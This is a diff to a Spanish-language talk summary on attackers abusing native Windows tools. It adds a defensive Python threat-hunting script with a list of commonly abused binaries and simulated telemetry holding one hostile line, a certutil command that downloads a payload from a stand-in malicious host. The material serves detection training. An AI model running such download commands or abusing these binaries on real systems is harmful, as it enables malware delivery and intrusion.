@@ -43,9 +43,42 @@ Tales Albuquerque resalta que los atacantes modernos eluden los antivirus tradic
 
 ---
 
-## Enlace al Audio
+## 🧪 Anexo Práctico: Estrategia Operativa y Laboratorio Open Source
 
-[▶️ Escuchar Podcast Resumen](../../assets/audio/dia2_05_albuquerque.mp3)
+### Estrategia Operativa Empresarial
+Para descubrir intrusos silenciosos que abusan de utilidades del sistema (LOLBAS) antes de que desplieguen ransomware, se deben configurar telemetrías avanzadas con Sysmon y ejecutar scripts periódicos de cacería activa que auditen árboles de procesos anómalos.
+
+### Código / Laboratorio Ejecutable
+```python
+# hunter_lolbas_processes.py
+# Herramienta de Threat Hunting para identificar binarios nativos abusados en endpoints
+import subprocess
+
+SUSPICIOUS_BINS = ["certutil.exe", "bitsadmin.exe", "mshta.exe", "vssadmin.exe", "wmic.exe"]
+
+def cazar_procesos_lotl():
+    print("[*] Ejecutando escaneo de procesos activos en búsqueda de técnicas LOLBAS...")
+    # Simulación de telemetría de procesos
+    procs = [
+        {"pid": 1024, "name": "certutil.exe", "cmd": "certutil -urlcache -split -f http://malicious.site/payload.exe"},
+        {"pid": 2048, "name": "svchost.exe", "cmd": "C:\Windows\system32\svchost.exe -k netsvcs"}
+    ]
+    
+    for p in procs:
+        if p["name"].lower() in SUSPICIOUS_BINS:
+            print(f"[!] AMENAZA DETECTADA (PID {p['pid']}): {p['name']} ejecutando: {p['cmd']}")
+            print("    -> Acción recomendada: Aislar endpoint inmediatamente e iniciar volcado de RAM.")
+
+if __name__ == "__main__":
+    cazar_procesos_lotl()
+```
+
+---
+
+## Recursos Multimedia Oficiales
+
+* [📺 Ver Ponencia en Video Oficial (Día 2 · Minuto 5:15:20)](https://www.youtube.com/watch?v=jLbdG67TqW8&t=5h15m20s)
+* [▶️ Escuchar Podcast Resumen](../../assets/audio/dia2_05_albuquerque.mp3)
 
 ---
 
